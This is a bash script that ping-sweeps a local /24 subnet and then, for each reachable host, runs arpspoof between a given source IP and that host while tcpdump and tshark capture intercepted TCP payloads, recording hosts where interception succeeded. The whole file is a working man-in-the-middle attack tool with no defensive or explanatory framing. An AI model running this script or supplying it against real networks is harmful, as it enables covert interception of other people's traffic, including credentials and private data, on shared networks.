#!/bin/bash

# Check if the required arguments are provided
if [ "$#" -ne 2 ]; then
    echo "Usage: $0 <source_ip> <interface>"
    exit 1
fi

source="$1"
interface="$2"
input_file="reachable_ips.txt"
successful_ips="successful_ips.txt"

# Step 1: Discover reachable IPs
output_file="reachable_ips.txt"
> "$output_file"  # Clear the output file at the start
> "$successful_ips" 

# Extract the first three octets from the provided IP address
ip_range=$(echo "$source" | awk -F. '{print $1"."$2"."$3}')

ping_ip() {
    local ip_addr="$1"
    if ping -c 1 -W 1 "$ip_addr" &> /dev/null; then
        echo "$ip_addr is reachable"
        echo "$ip_addr" >> "$output_file"  # Append reachable IP to the file
    fi
}


for i in {1..255}; do
    ip_addr="$ip_range.$i"
    ping_ip "$ip_addr" &
done


wait



# Check if there are reachable IPs
if [ ! -s "$output_file" ]; then
    echo "No reachable IPs found. Skipping ARP spoofing."
    exit 0
fi
echo "Ping sweep complete. Reachable IPs are stored in $output_file."
# Step 2: Perform ARP spoofing on reachable IPs
while IFS= read -r ip_addr; do
> x.txt 
    echo "Testing on $ip_addr"

    sudo rm -f capt.pcap
    
    sudo tcpdump -i "$interface" -w capt.pcap &
    tcpdump_pid=$!

    sudo tshark -f "tcp and src host $source and dst host $ip_addr" -Y "tcp.payload" &> x.txt &
    tshark_pid=$!

    sudo arpspoof -i "$interface" -t "$source" -r "$ip_addr" &> /dev/null &
    arpspoof_pid=$!

    sleep 30 # Wait for a bit to allow packet capture

    # Check if arpspoof is still running before attempting to kill it
    if ps -p $arpspoof_pid > /dev/null; then
        sudo kill $arpspoof_pid
    fi
   
    sleep 30  # Allow time for packet capture

    # Clean up the tshark process
    if ps -p $tshark_pid > /dev/null; then
        sudo kill $tshark_pid
    fi

    # Clean up the tcpdump process
    if ps -p $tcpdump_pid > /dev/null; then
        sudo kill $tcpdump_pid
    fi

    # Check the output from tshark
    if [ -s x.txt ]; then  # Only proceed if x.txt is not empty
        echo "Successfully Spoofed!"
        echo "$ip_addr" >> "$successful_ips"  # Save successful IPs
        break;
    else
        echo "Spoofing failed - No packets captured"
    fi
   

   # > x.txt  
done < "$output_file"

echo "ARP spoofing attempts completed."

